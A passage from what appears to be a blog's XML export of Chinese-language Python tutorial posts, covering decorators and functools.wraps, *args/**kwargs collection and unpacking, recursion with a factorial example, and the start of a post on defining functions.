        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>  <span class="token comment"># 展开参数</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    <span class="token keyword">return</span> inner<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样的count装饰器对于参数数量任意的函数都可以匹配了。</p>
<h4 id="带参数的装饰器"><a href="#带参数的装饰器" class="headerlink" title="带参数的装饰器"></a>带参数的装饰器</h4><p>装饰器也可以有参数！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>switch<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># switch为True则计时，否则关闭计时功能</span>
    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> switch<span class="token punctuation">:</span>
                start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>  
                result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
                end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span>
                <span class="token keyword">return</span> result
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> inner
    <span class="token keyword">return</span> wrapper

switch <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'是否计时？(y/n)'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@count</span><span class="token punctuation">(</span>switch<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>  <span class="token comment"># pass的意思是什么都不做</span>

func<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看完以后是不是有点晕？<code>(＠_＠;)</code></p>
<p>我来说说这个运行的过程：首先，程序等待输入，假定输入<code>y</code>，这是switch变量赋值为<code>True</code>，然后遇到<code>@count(switch)</code>，这一行相当于调用了count函数，这个函数返回了一个装饰器，就是里面的<code>wrapper</code>，然后对func函数使用这个装饰器。</p>
<p><code>(°ー°〃)</code></p>
<p>嗯？我应该说清楚了吧。。。</p>
<p>对！还有一个问题 <code>(°ー°〃)</code></p>
<h4 id="函数签名"><a href="#函数签名" class="headerlink" title="函数签名"></a>函数签名</h4><p>每个函数都有一个<strong>属性</strong>，叫做<strong>函数签名</strong>，就是函数的名字，比如print函数的<strong>函数签名</strong>可以这样获得：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">.</span>__name__
<span class="token string">'print'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>一个函数使用了装饰器，表面上还是使用这个函数的名字，实际上真的是这样吗？看下面代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> inner
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> @outer
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">.</span>__name__
<span class="token string">'inner'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>函数的签名已经改变了！</p>
<p>可是…</p>
<p>这个能有什么问题？</p>
<p><code>(￣︶￣)↗</code> 有些时候我们是需要使用这个函数签名的的，比如：根据输入的函数名字使用对应的函数（根据字符串获取函数的方法在后面的小实例有用到），有些模块也可能使用到了函数签名，如果不注意到这个细节，出错了也找不出什么问题来！</p>
<p>那么怎么解决？</p>
<p>解决这个问题的方法很简单，我们只需使用一个内置模块的装饰器：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> functools
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     @functools<span class="token punctuation">.</span>wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> inner
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> @outer
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">.</span>__name__
<span class="token string">'func'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码简洁明了，至于原理，我们奉行 “拿来主义”，只需要知道在用于包裹的函数上方加上<code>@functools.wraps()</code>即可，不必纠结functools.wraps的内部实现</p>
<h4 id="多个装饰器"><a href="#多个装饰器" class="headerlink" title="多个装饰器"></a>多个装饰器</h4><p>装饰器可以使用多个，多个装饰器的执行顺序是<strong>从下往上</strong>的，看下面这个例子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">wrapper_1</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrapper_1'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> inner
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">wrapper_2</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrapper_2'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> inner
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> @wrapper_1
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> @wrapper_2
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
wrapper_2
wrapper_1
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这很好理解，我们在包装东西的时候，都是先从最里面的一层开始，一层一层包裹，直到最外层（就像<a href="https://baike.baidu.com/item/%E4%BF%84%E7%BD%97%E6%96%AF%E5%A5%97%E5%A8%83/17215?fr=aladdin">“俄罗斯套娃“</a>），所以先执行<code>@wrapper_2</code>再执行外面的<code>@wrapper_1</code></p>
<p>与此同时，这个例子中并没有调用func函数，但是却有执行的print语句，这更进一步证明了，<code>@wrapper</code>这样的语句相当于执行了<code>func=wrapper(func)</code>，这是在函数定义的时候马上就执行的，而不是调用的时候才执行的，要注意了</p>
<hr>
<p>到目前，我们对函数的讲解就此结束，内容很多，读者们有得是时间消化了，也为我准备后面小实例提供了准备时间，读者们期待吧！（提示一下，我们将使用微信控制电脑！）</p>
<p><code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（三）·函数进阶（上）</title>
    <url>/ae669e21/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在介绍了函数定义的方法后，再来介绍一些进阶知识<span id="more"></span></p>
<h3 id="参数收集"><a href="#参数收集" class="headerlink" title="参数收集"></a>参数收集</h3><p>有时候我们需要参数的数量是任意的，比如print函数的参数的数量是任意的，print函数的内部实现我们不探究，但是单单是参数数量可变这一方面实现起来不难，我们只需像下面这样定义函数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">print_params</span><span class="token punctuation">(</span><span class="token operator">*</span>params<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，我们在函数的定义时，只定义了一个参数，但参数前面带有一个星号<code>*</code>，并且调用函数时，输出的结果显示，这个参数是一个元组，这个元组有我们调用时的所有参数。</p>
<p>实际上，参数前的星号的作用是，将<strong>剩下</strong>的值收集起来做为元组一个整体，给这个参数，何谓”剩下“？我们再来一段代码:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">print_params</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token operator">*</span>params<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可见，所谓“剩下”，就是除了开头的p1位置参数外，<strong>剩下</strong>的所有位置参数。</p>
<p>没错！是剩下的<strong>位置参数</strong>，收集<strong>剩下</strong>的关键字参数需要两个星号：<code>**</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">print_params</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token operator">*</span>params<span class="token punctuation">,</span> <span class="token operator">**</span>kwparams<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>kwparams<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> print_params<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'feather'</span><span class="token punctuation">,</span><span class="token string">'Lee'</span><span class="token punctuation">,</span> x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>z<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
hello
<span class="token punctuation">(</span><span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样看来很显而易见了，收集关键字参数的是元组，而收集关键字参数的是字典</p>
<p><strong>注意咯</strong>，在一个函数中只能定义一个<code>*</code>前缀参数和一个<code>**</code>前缀参数，为什么？可以想想python解释器怎么识别</p>
<h3 id="参数收集的逆过程"><a href="#参数收集的逆过程" class="headerlink" title="参数收集的逆过程"></a>参数收集的逆过程</h3><p>使用<code>*</code>和<code>**</code>在函数的定义时用于收集参数，而在调用时使用就是用于分配参数了</p>
<p>在元组前加上一个星号<code>*</code>，就会对元组（列表也可以）进行展开</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> x<span class="token operator">+</span>y
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> params <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> add<span class="token punctuation">(</span><span class="token operator">*</span>params<span class="token punctuation">)</span>
<span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的<code>add(*params)</code>中的<code>*params</code>会被展开成<code>add(1,2)</code>，这不正是把收集起来的位置参数再分配出来吗？</p>
<p>正如你所想，字典<code>&#123;&#39;x&#39;:1,&#39;y&#39;:2,&#39;z&#39;:3&#125;</code>，可以使用两个星号即<code>**</code>，展开成关键字参数调用的方式<code>x=1,y=2,z=3</code>，比如下面这段代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">printzyx</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> keys <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'x'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> printzyx<span class="token punctuation">(</span><span class="token operator">**</span>keys<span class="token punctuation">)</span>
<span class="token number">3</span>
<span class="token number">2</span>
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的<code>printzyx(**keys)</code>相当于<code>printzyx(x=1,y=2,z=3)</code></p>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>函数里可以调用其他函数，这是必然的，然而，函数还可以调用自身，上面说到，每次调用函数时都会生成一个新的命名空间，所以函数调用自身，实际上运行了两个不同的函数，这也是为什么函数可以调用“自身”了，这种现象称为<strong>递归</strong>。</p>
<p>递归这个词的意思简单说就是自己引用自己，递归有一个幽默的定义：</p>
<blockquote>
<p>递归[名词]：参见递归</p>
</blockquote>
<p>像这样自己解释自己，自己引用自己的都可以称为递归，像上面那样的递归，这是一个<strong>无穷递归</strong>，永远没有停止，如果定义一个函数像下面这样：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    func<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这个函数也是个<em>无穷递归</em>，运行不一会，程序就会崩溃，理论上，它应该永远运行下去，然而，每次调用函数都会用掉一点内存，这点内存要在函数结束时才会回收，递归达到一定深度后，python解释器提供的内存不够了，就会抛出错误信息结束程序。</p>
<p>显然，无穷递归做不了任何事情，如果想要做一些有用的事情，就要用到<em>有穷递归</em>，就好像循环语句中的使用break一样，在特定的条件下退出递归，当然啦，结束递归可不是用break，下面来个经典的递归函数</p>
<h4 id="计算阶乘"><a href="#计算阶乘" class="headerlink" title="计算阶乘"></a>计算阶乘</h4><p>n的阶乘定义为<code>n * (n-1) * (n-2) * ... * 1</code>，就是从n一直乘到1或者从1一直乘到n，我也不清楚它的用途，但是它的计算可以作为经典的递归例子</p>
<p>我们可以用循环来计算：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> n
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        result <span class="token operator">*=</span> i
    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么递归怎么用？阶乘的定义用递归来说就是：</p>
<ul>
<li>1的阶乘是1</li>
<li>大于1的数n的结成是n乘上n-1的阶乘</li>
</ul>
<p>定义中的第一点就是决定阶乘结束的条件了，理解了定义后，实现起来不难，如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> n <span class="token operator">*</span> factorial<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这是定义的直接实现，这并不难，可就是困扰了大部分计算机入门的同学</p>
<p>递归大部分情况下是可以用循环代替的，而且使用循环效率更高，但有些时候递归更加易读，尤其是懂得递归函数的定义的时候。</p>
<p>尽管可以避免编写使用递归的程序，但理解递归仍是一个非常重要的基本功，希望读者重视</p>
<hr>
<p>可以看到这篇文章的标题中带有<code>（上）</code>，也就是说还有下半部分，突然发现，写的文章太长了，就把这一节分成了上下两个部分，又延迟了后面的小实例的发布，是在不好意思，不过不用担心，下半部分马上就发布！</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（三）·自定义函数</title>
    <url>/d961aeb7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>前面介绍了如何使用函数，这一节我们就来学习怎么创建自己的函数！<span id="more"></span></p>
<h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><p>创建函数非常简单，它使用关键字 <strong>“def”</strong>，下面的代码创建了一个带有一个参数的函数，并使用不同的参数调用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>

hello<span class="token punctuation">(</span><span class="token string">'feather'</span><span class="token punctuation">)</span>  <span class="token comment"># 调用函数，传入参数 'feather'</span>
hello<span class="token punctuation">(</span><span class="token string">'csdn'</span><span class="token punctuation">)</span>  <span class="token comment"># 调用函数，传入参数 'csdn'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行程序可以得到下面输出：</p>
<pre class="line-numbers language-none"><code class="language-none">hello feather
hello csdn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可以看到，传入的参数被赋值给变量name，然后执行函数内的代码块，对！这也是一种代码块，注意后面的冒号</p>
<p>函数并非一定要有参数，我们完全可以定义一个不带参数的函数，比如这个</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello world!'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>像获取输入的函数input，返回用户的输入，我们也可以在函数中使用return语句来返回数据，下面是一个计算斐波那契数列第n项的函数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fibs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
